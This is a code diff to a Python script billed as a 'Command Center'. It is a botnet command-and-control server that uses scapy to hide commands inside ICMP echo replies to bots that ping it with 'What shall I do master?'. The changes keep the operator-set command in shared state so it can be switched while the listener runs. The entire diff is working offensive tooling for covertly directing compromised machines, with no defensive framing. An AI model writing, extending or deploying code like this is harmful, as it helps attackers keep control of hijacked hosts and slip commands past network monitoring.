@@ -13,10 +13,15 @@ import sys
 import signal
 from scapy.all import *
 
+#def updateCommand():
+#	return command
+
 def displayMenu():
 	print ""
 	print "Choose an option"
-        if not active_children():
+        #print "[D] Debug: ", active_children()
+	#print len(active_children())
+	if (active_children()[0].name == 'SyncManager-1'):
 		print "1) Start C2 listener"
         print "2) Show bots"
         print "3) Change bot command"
@@ -30,7 +35,7 @@ def handler(signum, frame):
 # Command and Control main function
 def c2main(command):
 	print ""
-        print "[*] Command received from C2: %s" % command
+        print "[*] Command received from C2: %s" % command.value
 	while True:
 		logfile_error = open('errors.log','w')
 		conf.verb = 0
@@ -45,8 +50,9 @@ def c2main(command):
                        		icmp_id = p['ICMP'].id
                        		#print "[*] Request: " + request
 				if request == 'What shall I do master?':
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command)
-                                	print "[*] Response sent to %s: %s" % (p['IP'].src,command)
+					#command=updateCommand()
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/str(command.value)
+                                	print "[*] Response sent to %s: %s" % (p['IP'].src,command.value)
                                 	#resp.show2()
                                 	send(resp)
 					displayMenu()
@@ -81,54 +87,46 @@ def main(argv):
         print "						    "
 	print "			Command Center              "
 	print "			   by NoCow		    "
+	manager = Manager()
+	command = manager.Namespace()
+	command.value = 'sysinfo'
+	#print "[*] Command: %s" % command.value
+	process = Process(target=c2main,args=(command,))
 	while True:
 		signal.signal(signal.SIGINT, handler)
 		displayMenu()
 		option = raw_input("Option: ")
 		if option == '1':
-			command = 'sysinfo'
-			if active_children():
+			command.value = 'sysinfo'
+			if (len(active_children()) > 1):
 				print "[*] Capture running. Stopping first."
-				for proc in active_children():		
-					proc.terminate()
+				for proc in active_children():
+					if proc.name != 'SyncManager-1':		
+						print "[D] Killing process: ", proc.name
+						proc.terminate()
 				print "[*] Starting new capture"
-				process = Process(target=c2main, args=([command]))
+				process = Process(target=c2main,args=(command,))
 				process.start()
 				if process.is_alive():
-					print "[*] C2 Listening - command: %s" % command
+					print "[*] C2 Listening - command: %s" % command.value
 				else:
 					print "[X] Error starting C2 listener"
 			else:
-				print "[*] No capture currently running. Starting..."
-				process = Process(target=c2main, args=([command]))
+				print "[*] No listener currently running. Starting..."
+				process = Process(target=c2main,args=(command,))
 				process.start()
 				if process.is_alive():
-					print "[*] C2 Listening - command: %s" % command
+					print "[*] C2 Listening - command: %s" % command.value
 				else:
 					print "[X] Error starting C2 listener"
 		elif option == '2':
 			print "Displaying bots"
 		elif option == '3':
-			command = raw_input("Enter a command: ")
-                        if active_children():
-                                print "[*] Capture running. Stopping first."
-                                for proc in active_children():
-                                        proc.terminate()
-                                print "[*] Starting new capture"
-                                process = Process(target=c2main, args=([command]))
-                                process.start()
-                                if process.is_alive():
-                                        print "[*] C2 Listening - command: %s" % command
-                                else:
-                                        print "[X] Error starting C2 listener"
+			command.value = raw_input("Enter a command: ")
+                        if process.is_alive():
+                        	print "[*] C2 Listening - command: %s" % command.value
                         else:
-                                print "[*] No capture currently running. Starting..."
-                                process = Process(target=c2main, args=([command]))
-                                process.start()
-                                if process.is_alive():
-                                        print "[*] C2 Listening - command: %s" % command
-                                else:
-                                        print "[X] Error starting C2 listener"
+                                print "[X] C2 listener not running. Please start listener first"
 		elif option == 'q':
 			for proc in active_children():
 				proc.terminate()
